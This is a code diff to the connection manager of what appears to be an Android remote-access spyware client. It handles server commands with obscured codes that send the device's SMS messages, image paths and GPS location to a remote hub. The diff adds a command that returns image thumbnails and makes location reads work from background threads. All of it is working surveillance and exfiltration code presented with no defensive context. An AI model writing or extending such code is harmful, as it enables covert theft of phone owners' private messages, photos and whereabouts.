@@ -16,6 +16,7 @@ import com.microsoft.signalr.HubConnection;
 import com.microsoft.signalr.HubConnectionState;
 import com.remote.app.socket.IOSocket;
 
+import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
@@ -74,6 +75,13 @@ public class ConnectionManager {
                 ex.printStackTrace();
             }
         });
+        ioSocket.on("0xTB", (imageId, path) -> {
+            try {
+                TB(imageId, path);
+            } catch (Exception ex) {
+                ex.printStackTrace();
+            }
+        }, Integer.class, String.class);
 
         ioSocket.on("0xSM", (action, to, sms) -> {
             try {
@@ -167,9 +175,13 @@ public class ConnectionManager {
         });
     }
 
+    public boolean isConnected(){
+        return ioSocket != null && ioSocket.getConnectionState() != HubConnectionState.DISCONNECTED;
+    }
+
     private void sendReq(String key) {
         try {
-            if (ioSocket != null && ioSocket.getConnectionState() != HubConnectionState.DISCONNECTED)
+            if (isConnected())
                 return;
 
             ioSocket = IOSocket.getInstance().init(key);
@@ -243,6 +255,16 @@ public class ConnectionManager {
         ioSocket.send("_0xGI", FileManager.getAllShownImagesPath().toString());
     }
 
+    private void TB(Integer imageId, String path) {
+        try {
+            JSONObject thumb = FileManager.getThumbnail(imageId, path);
+            if (thumb != null)
+                ioSocket.send("_0xTB", thumb.toString());
+        } catch (Exception ex) {
+            ex.printStackTrace();
+        }
+    }
+
     private void SM(int req, String phoneNo, String msg) {
         if (req == 0)
             ioSocket.send("_0xLM", SMSManager.getsms().toString());
@@ -289,13 +311,15 @@ public class ConnectionManager {
         }
     }
 
-    private void LO() throws Exception {
+    private void LO() {
         // check if GPS enabled
+        if (Looper.myLooper() == null)
+            Looper.prepare();
+
         locManager.getLocation();
         if (locManager.canGetLocation()) {
             ioSocket.send("_0xLO", locManager.getData().toString());
         }
-
     }
 
 }
